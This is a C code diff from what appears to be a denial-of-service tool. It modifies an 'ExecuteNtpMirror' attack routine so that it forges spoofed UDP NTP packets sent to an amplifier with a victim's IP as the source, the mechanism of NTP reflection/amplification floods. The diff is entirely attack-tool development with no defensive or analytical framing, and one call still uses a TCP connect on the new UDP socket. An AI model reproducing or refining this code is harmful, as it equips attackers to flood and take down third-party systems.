@@ -16,7 +16,7 @@
 
 void ntpSetValue( AttackPlan * p_atkData )
 {
-    int sock = CreateSocket(TCP, BLOCK);
+    int sock = CreateSocket(UDP, BLOCK);
     NtpBinaryResponseHeader response;
     ConnectTCP(sock, p_atkData->setPacket);
     for(Packet *tmpPkt = p_atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
@@ -43,8 +43,10 @@ static AttackPlan * createAttackDataNTP( LhfDraft *p_draft )
 
     memalloc( (void *)&newData, sizeof( AttackPlan ) );
     arg = NTP;
-    newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );;
-    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpText, &arg );
+    //newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
+    newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
+    // newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpText, &arg );
+    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
     newData->draft = p_draft;
     return newData;
 }
@@ -63,7 +65,6 @@ int  ExecuteNtpMirror( void *p_draft )
 {
     AttackPlan *plan;
     LhfDraft *draft = (LhfDraft *)p_draft;
-
     switch( draft->type )
     {
         case NTP:
